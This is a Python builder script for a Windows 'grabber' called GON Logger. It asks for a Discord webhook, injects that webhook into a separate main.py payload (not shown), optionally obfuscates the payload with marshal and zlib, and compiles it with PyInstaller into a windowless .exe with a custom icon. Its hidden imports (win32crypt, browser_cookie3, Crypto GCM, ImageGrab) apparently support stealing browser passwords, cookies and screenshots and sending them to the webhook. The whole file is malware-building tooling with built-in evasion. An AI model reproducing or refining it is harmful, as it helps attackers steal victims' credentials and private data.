import marshal
import zlib
import os
import time
import sys
import requests
import shutil
import tempfile
import subprocess
import platform
import warnings
warnings.filterwarnings("ignore", category=SyntaxWarning)
from pathlib import Path

logo = """
░██████╗░░█████╗░███╗░░██╗
██╔════╝░██╔══██╗████╗░██║
██║░░██╗░██║░░██║██╔██╗██║
██║░░╚██╗██║░░██║██║╚████║
╚██████╔╝╚█████╔╝██║░╚███║
░╚═════╝░░╚════╝░╚═╝░░╚══╝
    >> [Grabber developed by @tlwm]
"""

def check_system():
    if platform.system() != 'Windows':
        print("ERROR: This builder only works on Windows!")
        print("You must compile on Windows to create Windows .exe files")
        return False
    
    python_version = sys.version_info
    print(f"Python: {python_version.major}.{python_version.minor}.{python_version.micro}")
    
    if python_version.major == 3 and python_version.minor >= 14:
        print("Warning: Python 3.14+ may have compatibility issues")
        print("Recommended: Python 3.8-3.11 for best compatibility")
    
    return True

def check_dependencies():
    try:
        try:
            import win32con
            import win32crypt
            import win32api
            print("pywin32 modules found")
        except ImportError:
            print("Installing pywin32...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32==306'])
        
        try:
            from pystyle import Write, Colors, Center
            print("pystyle found")
        except ImportError:
            print("Installing pystyle...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pystyle'])
        
        return True
    except Exception as e:
        print(f"Error checking dependencies: {e}")
        return False

def install_all_dependencies():
    print("\n" + "="*60)
    print("INSTALLING ALL REQUIRED DEPENDENCIES")
    print("="*60)
    
    dependencies = [
        'requests',
        'pystyle', 
        'pyinstaller',
        'pywin32',
        'pycryptodomex',
        'browser-cookie3',
        'psutil',
        'pyautogui',
        'prettytable',
        'getmac',
        'discord-webhook',
        'pillow',
        'pywin32-ctypes'
    ]
    
    for dep in dependencies:
        try:
            print(f"Installing {dep}...")
            subprocess.run(
                [sys.executable, '-m', 'pip', 'install', dep],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"{dep} installed")
        except subprocess.CalledProcessError:
            print(f"Failed to install {dep}")
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', dep], check=True)
                print(f"{dep} installed (second attempt)")
            except:
                print(f"Could not install {dep}, skipping...")
    
    print("\n" + "="*60)
    print("DEPENDENCIES INSTALLATION COMPLETE")
    print("="*60)
    time.sleep(2)
    return True

def fix_python_314_issues():
    python_version = sys.version_info
    
    if python_version.major == 3 and python_version.minor >= 14:
        print("\n" + "="*60)
        print("APPLYING PYTHON 3.14 FIXES")
        print("="*60)
        
        print("1. Fixing module imports...")
        
        try:
            import PyInstaller
            if PyInstaller.__version__ < '6.0':
                print("Updating PyInstaller...")
                subprocess.run([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pyinstaller'])
        except:
            pass
        
        print("Python 3.14 fixes applied")
        print("="*60 + "\n")
    
    return True

def download_icon(icon_url, output_path):
    try:
        response = requests.get(icon_url, timeout=10)
        if response.status_code == 200:
            with open(output_path, 'wb') as f:
                f.write(response.content)
            return True
        return False
    except:
        return False

def convert_to_ico(image_path, ico_path):
    try:
        from PIL import Image
        
        if image_path.lower().endswith('.ico'):
            shutil.copy(image_path, ico_path)
            return True
        
        img = Image.open(image_path)
        img.save(ico_path, format='ICO')
        return True
            
    except Exception as e:
        print(f"Could not convert to .ico: {e}")
        return False

def is_valid_discord_webhook(url):
    valid_patterns = [
        "https://discord.com/api/webhooks/",
        "https://discordapp.com/api/webhooks/"
    ]
    
    return any(url.startswith(pattern) for pattern in valid_patterns)

def compile_with_pyinstaller(name, icon_path=None):
    hidden_imports = [
        'win32con', 'win32crypt', 'win32api', 'win32security', 'win32event',
        'requests', 'urllib3', 'chardet', 'idna', 'certifi',
        'browser_cookie3', 'lz4', 
        'Crypto', 'Crypto.Cipher', 'Crypto.Cipher._mode_gcm', 'Crypto.Util',
        'psutil', 'pyautogui', 'prettytable', 'getmac',
        'discord_webhook',
        'PIL', 'PIL.Image', 'PIL.ImageGrab',
        'multiprocessing', 'multiprocessing.util',
        'collections.abc', 'json', 're', 'sqlite3', 'base64',
        'tempfile', 'datetime', 'zipfile',
        'importlib_resources', 'importlib_metadata'
    ]
    
    cmd_parts = [
        'pyinstaller',
        '--onefile',
        '--noconsole',
        '--clean',
        '--noconfirm',
    ]
    
    for imp in hidden_imports:
        cmd_parts.append(f'--hidden-import={imp}')
    
    if icon_path and os.path.exists(icon_path):
        cmd_parts.append(f'--icon="{icon_path}"')
    
    cmd_parts.append('--additional-hooks-dir=.')
    cmd_parts.append('--exclude-module=tkinter')
    cmd_parts.append('--exclude-module=test')
    cmd_parts.append('--exclude-module=unittest')
    cmd_parts.append(f'"{name}.py"')
    
    cmd = ' '.join(cmd_parts)
    
    print("\n" + "="*60)
    print("COMPILATION COMMAND")
    print("="*60)
    print(cmd)
    print("="*60 + "\n")
    
    print("Starting compilation... This may take several minutes...")
    
    try:
        with open('compile_log.txt', 'w') as log_file:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            for line in process.stdout:
                print(line.strip())
                log_file.write(line)
                log_file.flush()
            
            process.wait()
            
        if process.returncode == 0:
            print("\nCompilation successful!")
            return True
        else:
            print(f"\nCompilation failed with code {process.returncode}")
            return False
            
    except Exception as e:
        print(f"\nError during compilation: {e}")
        return False

def main():
    if not check_system():
        return
    
    if not check_dependencies():
        install_all_dependencies()
    
    fix_python_314_issues()
    
    try:
        from pystyle import Write, Colors, Center
    except:
        print("Failed to import pystyle. Please install manually: pip install pystyle")
        return
    
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('title GON Logger Builder')
    
    Write.Print(Center.XCenter(logo + "\n"), Colors.purple_to_blue, interval=0.005)
    Write.Print(Center.XCenter("GitHub: @00ie | Discord: tlwm | Telegram: feicoes\n\n"), Colors.cyan_to_blue, interval=0.01)
    
    current_dir = os.path.dirname(os.path.abspath(__file__))
    main_py_path = os.path.join(current_dir, "main.py")
    
    if not os.path.exists(main_py_path):
        Write.Print("\nmain.py not found in current directory!\n", Colors.red, interval=0.01)
        Write.Print("Please make sure main.py is in the same folder as this builder.\n", Colors.yellow, interval=0.01)
        time.sleep(3)
        exit()
    
    webhook = Write.Input("\nEnter webhook URL: ", Colors.purple_to_blue, interval=0.01)
    
    if not is_valid_discord_webhook(webhook):
        Write.Print("\nInvalid Discord webhook format!\n", Colors.red, interval=0.01)
        Write.Print("Valid formats:\n", Colors.yellow, interval=0.01)
        Write.Print("  • https://discord.com/api/webhooks/ID/TOKEN\n", Colors.cyan, interval=0.01)
        Write.Print("  • https://discordapp.com/api/webhooks/ID/TOKEN\n", Colors.cyan, interval=0.01)
        time.sleep(3)
        exit()
    
    try:
        r = requests.get(webhook, timeout=10)
        if r.status_code == 200:
            Write.Print("\nWebhook Is Working\n", Colors.green, interval=0.01)
            time.sleep(1)
        elif r.status_code == 404:
            Write.Print("\nWebhook not found (404)\n", Colors.red, interval=0.01)
            Write.Print("The webhook URL might be invalid or deleted.\n", Colors.yellow, interval=0.01)
            time.sleep(3)
            exit()
        else:
            Write.Print(f"\nWebhook returned status code: {r.status_code}\n", Colors.yellow, interval=0.01)
            Write.Print("Continuing anyway...\n", Colors.blue, interval=0.01)
            time.sleep(1)
    except requests.exceptions.RequestException as e:
        Write.Print(f"\nCould not verify webhook: {e}\n", Colors.yellow, interval=0.01)
        Write.Print("Continuing anyway...\n", Colors.blue, interval=0.01)
        time.sleep(1)
    
    name = Write.Input("\nEnter output filename (without .py): ", Colors.purple_to_blue, interval=0.01)
    
    Write.Print(f"\nReading main.py from local folder...\n", Colors.blue, interval=0.01)
    
    try:
        with open(main_py_path, 'r', encoding='utf-8') as f:
            original_code = f.read()
        
        import re
        
        webhook_pattern = r'WEBHOOK_URL\s*=\s*["\'][^"\']*["\']'
        
        if re.search(webhook_pattern, original_code):
            modified_code = re.sub(webhook_pattern, f'WEBHOOK_URL = "{webhook}"', original_code)
        else:
            modified_code = original_code.replace("WEBHOOK_PLACEHOLDER", webhook)
            modified_code = modified_code.replace("webhook_url_here", webhook)
            
            if webhook not in modified_code:
                lines = modified_code.split('\n')
                for i, line in enumerate(lines):
                    if 'WEBHOOK_URL =' in line:
                        lines[i] = f'WEBHOOK_URL = "{webhook}"'
                        break
                modified_code = '\n'.join(lines)
        
        output_py = f"{name}.py"
        with open(output_py, 'w', encoding='utf-8') as f:
            f.write(modified_code)
        
        Write.Print(f"{name}.py created successfully!\n", Colors.green, interval=0.01)
        
    except Exception as e:
        Write.Print(f"Error processing main.py: {e}\n", Colors.red, interval=0.01)
        exit()
    
    protection = Write.Input(f"\nAdd obfuscation to {name}.py? (y/n): ", Colors.purple_to_blue, interval=0.01).lower()
    
    if protection == 'y':
        try:
            with open(f'{name}.py', 'r', encoding='utf-8') as fi:
                code_to_obfuscate = fi.read()
            
            marshaled = marshal.dumps(compile(code_to_obfuscate, f'{name}.py', 'exec'))
            compressed = zlib.compress(marshaled)
            
            with open(f"{name}.py", 'w', encoding='utf-8') as f:
                obfuscated_code = f'''
import marshal, zlib
exec(marshal.loads(zlib.decompress({compressed})))
'''
                f.write(obfuscated_code)
            
            Write.Print("Code obfuscated successfully!\n", Colors.green, interval=0.01)
        except Exception as e:
            Write.Print(f"Could not obfuscate: {e}\n", Colors.yellow, interval=0.01)
    
    compile_choice = Write.Input("\nCompile to .exe? (y/n): ", Colors.purple_to_blue, interval=0.01).lower()
    
    icon_path = None
    if compile_choice == 'y':
        icon_choice = Write.Input("\nAdd icon to .exe? (y/n): ", Colors.purple_to_blue, interval=0.01).lower()
        
        if icon_choice == 'y':
            icon_url = Write.Input("\nEnter icon URL (JPG/PNG/ICO): ", Colors.purple_to_blue, interval=0.01)
            
            if icon_url and icon_url.strip():
                Write.Print("\nDownloading icon...\n", Colors.blue, interval=0.01)
                
                temp_dir = tempfile.mkdtemp()
                temp_icon = os.path.join(temp_dir, "temp_icon")
                
                if download_icon(icon_url, temp_icon):
                    ico_path = os.path.join(temp_dir, "icon.ico")
                    
                    if convert_to_ico(temp_icon, ico_path):
                        icon_path = ico_path
                        Write.Print("Icon downloaded and converted successfully!\n", Colors.green, interval=0.01)
                    else:
                        if temp_icon.lower().endswith('.ico'):
                            icon_path = temp_icon
                            Write.Print("Icon downloaded successfully!\n", Colors.green, interval=0.01)
                        else:
                            Write.Print("Could not convert icon to .ico format\n", Colors.yellow, interval=0.01)
                else:
                    Write.Print("Could not download icon\n", Colors.red, interval=0.01)
        
        success = compile_with_pyinstaller(name, icon_path)
        
        if icon_path:
            try:
                shutil.rmtree(os.path.dirname(icon_path))
            except:
                pass
        
        if success and os.path.exists('dist'):
            exe_path = os.path.join('dist', f'{name}.exe')
            if os.path.exists(exe_path):
                Write.Print(f"\n{name}.exe created in dist/ folder!\n", Colors.green, interval=0.01)
                
                exe_size = os.path.getsize(exe_path) / (1024 * 1024)
                Write.Print(f"Executable size: {exe_size:.2f} MB\n", Colors.cyan, interval=0.01)
                
                move_choice = Write.Input(f"\nMove {name}.exe to current folder? (y/n): ", Colors.purple_to_blue, interval=0.01).lower()
                if move_choice == 'y':
                    try:
                        shutil.move(exe_path, f'{name}.exe')
                        Write.Print(f"Moved to {name}.exe\n", Colors.green, interval=0.01)
                        
                        try:
                            shutil.rmtree('dist')
                        except:
                            pass
                    except Exception as e:
                        Write.Print(f"Could not move: {e}\n", Colors.yellow, interval=0.01)
            else:
                Write.Print("\nCompilation might have failed - .exe not found\n", Colors.yellow, interval=0.01)
        else:
            Write.Print("\nCompilation might have failed\n", Colors.yellow, interval=0.01)
    
    Write.Print("\n" + "="*50 + "\n", Colors.purple, interval=0.01)
    Write.Print("Builder completed successfully!\n", Colors.green, interval=0.01)
    Write.Print(f"Developer: @tlwm\n", Colors.cyan, interval=0.01)
    Write.Print(f"GitHub: github.com/00ie\n", Colors.cyan, interval=0.01)
    
    Write.Print("\nThe program will exit in 5 seconds...\n", Colors.blue, interval=0.01)
    Write.Print("="*50 + "\n", Colors.purple, interval=0.01)
    
    time.sleep(5)

if __name__ == "__main__":
    main()
